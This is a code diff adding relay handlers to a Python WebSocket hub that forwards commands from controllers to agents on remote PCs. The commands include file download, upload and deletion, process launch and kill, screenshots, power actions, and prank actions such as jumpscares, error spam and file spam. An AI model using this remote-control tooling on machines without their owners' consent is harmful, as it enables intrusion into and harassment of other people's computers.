@@ -169,6 +169,39 @@ class Hub:
             "requester_id": requester_id,
         })
 
+    async def relay_file_request(self, pc_id: str, payload: Dict[str, Any], requester_id: str):
+        agent = self.agents.get(pc_id)
+        request_id = payload.get("request_id", "")
+        if not agent:
+            ctrl = self.controllers.get(requester_id)
+            if ctrl:
+                await self._safe_send(ctrl.ws, {"type": "file_result", "request_id": request_id, "ok": False, "error": "PC offline"})
+            return
+        msg = dict(payload)
+        msg["requester_id"] = requester_id
+        await self._safe_send(agent.ws, msg)
+
+    async def relay_power(self, pc_id: str, action: str, requester_id: str):
+        agent = self.agents.get(pc_id)
+        if not agent:
+            ctrl = self.controllers.get(requester_id)
+            if ctrl:
+                await self._safe_send(ctrl.ws, {"type": "power_result", "ok": False, "action": action, "error": "PC offline"})
+            return
+        await self._safe_send(agent.ws, {"type": "power", "action": action, "requester_id": requester_id})
+
+    async def relay_agent_command(self, pc_id: str, payload: Dict[str, Any], requester_id: str):
+        agent = self.agents.get(pc_id)
+        command_type = payload.get("type", "")
+        if not agent:
+            ctrl = self.controllers.get(requester_id)
+            if ctrl:
+                await self._safe_send(ctrl.ws, {"type": f"{command_type}_result", "ok": False, "error": "PC offline"})
+            return
+        msg = dict(payload)
+        msg["requester_id"] = requester_id
+        await self._safe_send(agent.ws, msg)
+
     async def relay_history_result(self, requester_id: str, request_id: str, kind: str, ok: bool, entries, error: Optional[str]):
         ctrl = self.controllers.get(requester_id)
         if ctrl:
@@ -180,6 +213,25 @@ class Hub:
                 "entries": entries or [],
                 "error": error,
             })
+
+    async def relay_file_result(self, requester_id: str, payload: Dict[str, Any]):
+        ctrl = self.controllers.get(requester_id)
+        if ctrl:
+            msg = dict(payload)
+            msg["type"] = "file_result"
+            await self._safe_send(ctrl.ws, msg)
+
+    async def relay_power_result(self, requester_id: str, payload: Dict[str, Any]):
+        ctrl = self.controllers.get(requester_id)
+        if ctrl:
+            msg = dict(payload)
+            msg["type"] = "power_result"
+            await self._safe_send(ctrl.ws, msg)
+
+    async def relay_command_result(self, requester_id: str, payload: Dict[str, Any]):
+        ctrl = self.controllers.get(requester_id)
+        if ctrl:
+            await self._safe_send(ctrl.ws, payload)
 
     @staticmethod
     async def _safe_send(ws: WebSocket, payload: Dict[str, Any]):
@@ -251,6 +303,12 @@ async def ws_agent(ws: WebSocket):
                     msg.get("entries", []),
                     msg.get("error"),
                 )
+            elif t == "file_result":
+                await hub.relay_file_result(msg.get("requester_id", ""), msg)
+            elif t == "power_result":
+                await hub.relay_power_result(msg.get("requester_id", ""), msg)
+            elif t in {"sound_result", "schedule_result", "volume_result", "process_list_result", "process_result"}:
+                await hub.relay_command_result(msg.get("requester_id", ""), msg)
             elif t == "browsers_update":
                 a = hub.agents.get(pc_id)
                 if a:
@@ -303,6 +361,12 @@ async def ws_controller(ws: WebSocket):
                     msg.get("request_id", ""),
                     controller_id,
                 )
+            elif t in {"list_files", "download_file", "upload_file", "delete_file"}:
+                await hub.relay_file_request(msg.get("pc_id", ""), msg, controller_id)
+            elif t == "power":
+                await hub.relay_power(msg.get("pc_id", ""), msg.get("action", ""), controller_id)
+            elif t in {"play_sound", "schedule_action", "set_volume", "list_processes", "kill_process", "run_process", "jumpscare", "error_spam", "error_spam_stop", "shuffle_windows", "shuffle_windows_stop", "change_wallpaper", "spam_files", "take_screenshot", "get_system_info", "create_folder"}:
+                await hub.relay_agent_command(msg.get("pc_id", ""), msg, controller_id)
             elif t == "ping":
                 await ws.send_json({"type": "pong"})
     except WebSocketDisconnect:
